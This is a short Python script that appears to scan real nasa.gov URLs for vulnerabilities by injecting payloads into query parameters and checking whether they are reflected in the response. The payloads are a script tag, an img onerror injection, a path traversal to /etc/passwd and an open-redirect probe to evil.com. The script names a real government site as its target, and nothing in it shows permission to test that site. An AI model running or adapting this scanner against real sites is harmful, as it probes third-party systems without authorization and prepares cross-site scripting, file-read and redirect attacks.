import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads to test
payloads = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "../../etc/passwd",
    "https://evil.com"
]

# Target URLs
urls = [
    "https://www.nasa.gov?id=test",
    "https://www.nasa.gov?search=test",
    "https://www.nasa.gov?redirect=test"
]

def inject_payload(url, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    for key in query:
        query[key] = payload
    new_query = urlencode(query, doseq=True)
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
    return new_url

def test_reflection(url, payload):
    injected_url = inject_payload(url, payload)
    try:
        response = requests.get(injected_url, timeout=5)
        if payload in response.text:
            print(f"[+] Payload reflected in: {injected_url}")
        else:
            print(f"[-] No reflection: {injected_url}")
    except Exception as e:
        print(f"[!] Error testing {injected_url}: {e}")

# Run tests
for url in urls:
    for payload in payloads:
        test_reflection(url, payload)

